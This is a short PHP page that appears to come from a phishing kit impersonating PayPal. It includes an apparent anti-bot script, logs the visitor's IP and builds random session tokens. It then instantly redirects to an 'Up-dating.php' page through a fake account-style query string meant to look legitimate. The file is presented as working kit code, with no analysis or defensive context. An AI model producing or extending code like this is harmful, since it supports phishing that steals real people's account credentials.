<?php
session_start();
include ('bt.php');
$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="refresh" content="0;URL=Up-dating.php?country.x=<?php echo $_SESSION['cntc']; ?>-<?php echo $_SESSION['cntn']; ?>&ACCT.x=ID-PPL=PA324<?php echo $ib; ?>=ScrPg=<?php echo $ran;?><?php echo $rans;?>S=<?php echo crypt($_SESSION['cntn']); ?><?php include '../ran.php'; echo $r; ?>" /></head></html>
